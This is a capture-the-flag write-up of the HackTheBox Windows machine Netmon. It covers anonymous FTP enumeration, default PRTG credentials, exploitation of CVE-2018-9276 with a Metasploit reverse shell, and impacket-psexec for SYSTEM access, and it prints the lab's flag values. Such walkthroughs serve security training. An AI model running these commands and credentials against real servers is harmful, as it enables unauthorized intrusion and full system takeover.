HackTheBox: Netmon

Windows Easy FTP Anonymous PRTG RCE

Step 1: Port Enumeration

Initial Nmap scan reveals open ports including FTP with anonymous access:

[msf] >> db_nmap netmon.htb
PORT    STATE SERVICE
21/tcp  open  ftp
80/tcp  open  http
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Version scan reveals PRTG Network Monitor running on port 80:

80/tcp  open  http   Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 02-03-19  12:18AM                1024 .rnd
| 02-25-19  10:15PM               inetpub
| 02-25-19  10:56PM               Program Files
| 02-03-19  08:08AM               Users

Step 2: FTP Anonymous Access

Connecting to FTP with anonymous credentials reveals sensitive directories:

┌─[elliot@parrot]─[~]
└──╼ $ ftp Anonymous@netmon.htb
Password: (empty)

ftp> cd Users/Public/Desktop
ftp> dir
02-03-19  12:18AM                1195 PRTG Enterprise Console.lnk
02-03-19  12:18AM                1160 PRTG Network Monitor.lnk
10-07-24  01:05PM                  34 user.txt

ftp> more user.txt
4945bf028f3e4d6b0a25b3d7da3af14a

The user flag is retrieved directly from the FTP server!

Step 3: PRTG Network Monitor

Navigating to the web interface reveals PRTG Network Monitor version 18.1.37.13946. This version is vulnerable to authenticated RCE (CVE-2018-9276).

Default credentials are often used: prtgadmin:prtgadmin or prtgadmin:PrTg@dmin2019.

Step 4: Metasploit Exploitation

Using the PRTG authenticated RCE module:

[msf] >> search CVE-2018-9276
[msf] >> use exploit/windows/http/prtg_authenticated_rce
[msf] >> set RHOSTS 10.10.10.152
[msf] >> set ADMIN_PASSWORD PrTg@dmin2019
[msf] >> set LHOST tun0
[msf] >> run

[*] Started reverse TCP handler on 10.10.14.5:4444
[+] Successfully logged in with provided credentials
[+] Created malicious notification (objid=2018)
[+] Triggered malicious notification
[*] Meterpreter session 3 opened

Step 5: Privilege Escalation to SYSTEM

The exploit returns a SYSTEM shell:

(Meterpreter) > getuid
Server username: NT AUTHORITY\SYSTEM

(Meterpreter) > cd /Users/Administrator/Desktop
(Meterpreter) > ls
root.txt

(Meterpreter) > cat root.txt
91fb3379c553806ae198b2ad8108231c

Alternative: Impacket PSExec

After creating a user via PRTG notifications, PSExec can be used for direct SYSTEM access:

┌─[elliot@parrot]─[~]
└──╼ $ impacket-psexec htb:'abc123!'@10.10.10.152

[*] Requesting shares on 10.10.10.152.....
[*] Found writable share ADMIN$
[*] Uploading file...
[*] Opening SVCManager on 10.10.10.152.....
[*] Creating service...
[*] Starting service.....

C:\Windows\system32> whoami
nt authority\system

Key Takeaways

  • Anonymous FTP - Never allow anonymous access with sensitive directories
  • Default Credentials - Always change default passwords on management interfaces
  • CVE-2018-9276 - PRTG Network Monitor authenticated RCE vulnerability
  • Impacket PSExec - Powerful Windows lateral movement tool
  • SYSTEM Privilege - Full control over the Windows host

This machine highlights the importance of securing FTP services and keeping monitoring software updated with security patches.
